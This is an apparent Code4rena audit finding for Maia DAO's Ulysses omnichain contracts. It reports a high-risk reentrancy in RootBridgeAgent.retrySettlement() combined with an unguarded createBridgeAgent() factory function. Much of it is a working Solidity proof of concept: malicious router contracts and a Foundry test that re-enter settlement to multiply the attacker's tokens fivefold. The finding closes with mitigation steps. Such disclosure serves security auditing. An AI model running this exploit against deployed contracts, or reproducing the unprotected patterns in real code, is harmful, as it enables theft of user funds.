## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-18

# [Reentrancy attack possible on `RootBridgeAgent.retrySettlement()` with missing access control for `RootBridgeAgentFactory.createBridgeAgent()`](https://github.com/code-423n4/2023-05-maia-findings/issues/492) 

# Lines of code

https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75


# Vulnerability details


`RootBridgeAgent.retrySettlement()` is lacking a `lock` modifier to prevent reentrancy. And `RootBridgeAgentFactory.createBridgeAgent()` is missing access control. Both issues combined allows anyone to re-enter `retrySettlement()` and trigger the same settlement repeatedly.


## Impact
An attacker can steal funds from the protocol by executing the same settlement multiple times before it is marked as executed.

## Detailed Explanation
### Issue #1
 In `RootBridgeAgentFactory`, the privileged function `createBridgeAgent()` is lacking access control, which allows anyone to deploy a new `RootBridgeAgent`. Leveraging that, the attacker can inject malicious RootRouter and BranchRouter that can be used to trigger a reentrancy attack in `retrySettlement()`. Injection of the malicious BranchRouter is done with a separate call to `CoreRootRouter.addBranchToBridgeAgent()` in [CoreRootRouter.sol#L81-L116](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/CoreRootRouter.sol#L81-L116), refer to POC for actual steps.

```Solidity
    function createBridgeAgent(address _newRootRouterAddress) external returns (address newBridgeAgent) {
        newBridgeAgent = address(
            DeployRootBridgeAgent.deploy(
                wrappedNativeToken,
                rootChainId,
                daoAddress,
                localAnyCallAddress,
                localAnyCallExecutorAddress,
                rootPortAddress,
                _newRootRouterAddress
            )
        );

        IRootPort(rootPortAddress).addBridgeAgent(msg.sender, newBridgeAgent);
    }
```
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75C1-L89C6


### Issue #2
In `RootBridgeAgent`, the `retrySettlement()` function is not protected from reentrancy with the `lock` modifier. We can then re-enter this function via the injected malicious BranchRouter (Issue #1). The malicious BranchRouter can be triggered via `BranchBridgeAgentExecutor` when the attacker perform the settlement call. That  will execute `IRouter(_router).anyExecuteSettlement()` when additional calldata is passed in as shown in [BranchBridgeAgentExecutor.sol#L110](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgentExecutor.sol#L110).
```Solidity
    function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }
```
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252


## Proof of Concept
1. First append the following malicious router contracts to `RootTest.t.sol`.

```Solidity
import {
    SettlementParams
} from "@omni/interfaces/IBranchBridgeAgent.sol";

contract AttackerBranchRouter is BaseBranchRouter {

    uint256 counter;

    function anyExecuteSettlement(bytes calldata data, SettlementParams memory sParams)
        external
        override
        returns (bool success, bytes memory result)
    {
        // limit the recursive loop to re-enter 4 times (just for POC purpose)
        if(counter++ == 4) return (true, "");

        address rootBridgeAgentAddress =  address(uint160(bytes20(data[0:20])));

        // Re-enter retrySettlement() before the first settlement is marked as executed
        RootBridgeAgent rootBridgeAgent = RootBridgeAgent(payable(rootBridgeAgentAddress));
        rootBridgeAgent.retrySettlement{value: 3e11 }(sParams.settlementNonce, 1e11);

        // Top-up gas for BranchBridgeAgent as retrySettlement() will refund gas after each call
        BranchBridgeAgent branchAgent = BranchBridgeAgent(payable(localBridgeAgentAddress));
        WETH9 nativeToken = WETH9(branchAgent.wrappedNativeToken());
        nativeToken.deposit{value: 1e11}();
        nativeToken.transfer(address(branchAgent), 1e11);
    }

    fallback() external payable {}
}

contract AttackerRouter is Test {

    function reentrancyAttack(
        RootBridgeAgent _rootBridgeAgent, 
        address owner,
        address recipient,
        address outputToken,
        uint256 amountOut,
        uint256 depositOut,
        uint24 toChain
    ) external payable {

        // Approve Root Port to spend/send output hTokens.
        ERC20hTokenRoot(outputToken).approve(address(_rootBridgeAgent), amountOut);

        // Encode calldata to pass in rootBridgeAgent address and 
        // also to trigger exeuction of anyExecuteSettlement
        bytes memory data = abi.encodePacked(address(_rootBridgeAgent));

        // Initiate the first settlement
        _rootBridgeAgent.callOutAndBridge{value: msg.value}(
            owner, recipient, data, outputToken, amountOut, depositOut, toChain
        );
    }
}
```

2. Then add and run following test case in the `RootTest` contract within `RootTest.t.sol`.

```Solidity
    function testPeakboltRetrySettlementReentrancy() public {
        //Set up
        testAddLocalTokenArbitrum();

        address attacker = address(0x999);

        // Attacker deploys RootBridgeAgent with malicious Routers 
        // Issue 1 - RootBridgeAgentFactory.createBridgeAgent() has no access control, 
        //           which allows anyone to create RootBridgeAgent and inject RootRouter and BranchRouter.
        hevm.startPrank(attacker);
        AttackerRouter attackerRouter = new AttackerRouter();
        AttackerBranchRouter attackerBranchRouter = new AttackerBranchRouter();
        RootBridgeAgent attackerBridgeAgent = RootBridgeAgent(
            payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(attackerRouter)))
        );
        attackerBridgeAgent.approveBranchBridgeAgent(ftmChainId);
        hevm.stopPrank();

        //Get some gas.
        hevm.deal(attacker, 0.1 ether);
        hevm.deal(address(attackerBranchRouter), 0.1 ether);

        // Add FTM branchBridgeAgent and inject the malicious BranchRouter 
        hevm.prank(attacker);
        rootCoreRouter.addBranchToBridgeAgent{value: 1e12}(
            address(attackerBridgeAgent),
            address(ftmBranchBridgeAgentFactory),
            address(attackerBranchRouter),
            address(ftmCoreRouter),
            ftmChainId,
            5e11
        );

        // Initialize malicious BranchRouter with the created BranchBridgeAgent for FTM 
        BranchBridgeAgent attackerBranchBridgeAgent = BranchBridgeAgent(payable(attackerBridgeAgent.getBranchBridgeAgent(ftmChainId)));
        hevm.prank(attacker);
        attackerBranchRouter.initialize(address(attackerBranchBridgeAgent));


        // Get some hTokens for attacker to create the first settlement
        uint128 settlementAmount = 10 ether;
        hevm.prank(address(rootPort));
        ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(attacker, settlementAmount, rootChainId);

        console2.log("STATE BEFORE:");

        // Attacker should have zero AvaxAssetLocalToken before bridging to FTM via the settlement
        console2.log("Attacker newAvaxAssetLocalToken (FTM) Balance: \t", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));
        require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 0);

        // Attacker will start with 1e18 hTokens for the first settlement
        console2.log("Attacker Global Balance: \t", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));
        require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == settlementAmount);

        // Expect next settlementNonce to be '1' before settlement creation
        console2.log("attackerBridgeAgent.settlementNonce: %d", attackerBridgeAgent.settlementNonce());
        require(attackerBridgeAgent.settlementNonce() == 1);

        // Execution history in BranchBridgeAgent is not marked yet
        console2.log("attackerBranchBridgeAgent.executionHistory(1) = %s", attackerBranchBridgeAgent.executionHistory(1));
        console2.log("attackerBranchBridgeAgent.executionHistory(2) = %s", attackerBranchBridgeAgent.executionHistory(2));


        // Attacker transfers hTokens into router, triggers the first settlement and then the reentrancy attack
        // Issue 2 - RootBridgeAgent.retrySettlement() has no lock to prevent reentrancy 
        //           We can re-enter retrySettlement() via the injected malicious BranchRouter (above)
        //           Refer to AttackerRouter and AttackerBranchRouter contracts to see the reentrance calls
        hevm.prank(attacker);
        MockERC20(newAvaxAssetGlobalAddress).transfer(address(attackerRouter), settlementAmount);

        hevm.prank(attacker);
        attackerRouter.reentrancyAttack{value: 1e13 }(attackerBridgeAgent, attacker, attacker, address(newAvaxAssetGlobalAddress), settlementAmount,  0, ftmChainId);
  

        console2.log("STATE AFTER:");

        // Attacker will now have 5e19 AvaxAssetLocalToken after using 1e19 and some gas to perform 4x recursive reentrancy attack
        console2.log("Attacker newAvaxAssetLocalToken (FTM) Balance: ", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));
        require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 5e19);

        // The hTokens have been used for the first settlement
        console2.log("Attacker Global Balance: ", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));
        require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == 0);

        // Expect next settlementNonce to be '2' as we only used '1' for the attacker
        console2.log("attackerBridgeAgent.settlementNonce: %d",  attackerBridgeAgent.settlementNonce());
        require(attackerBridgeAgent.settlementNonce() == 2);

        // This shows that only execution is marked for settlementNonce '1' 
        console2.log("attackerBranchBridgeAgent.executionHistory(1): %s", attackerBranchBridgeAgent.executionHistory(1));
        console2.log("attackerBranchBridgeAgent.executionHistory(2): %s", attackerBranchBridgeAgent.executionHistory(2));
    
    }
```

## Recommended Mitigation Steps
Add `lock` modifier to `RootBridgeAgent.retrySettlement()` and add access control to `RootBridgeAgentFactory.createBridgeAgent()`.



## Assessed type

Other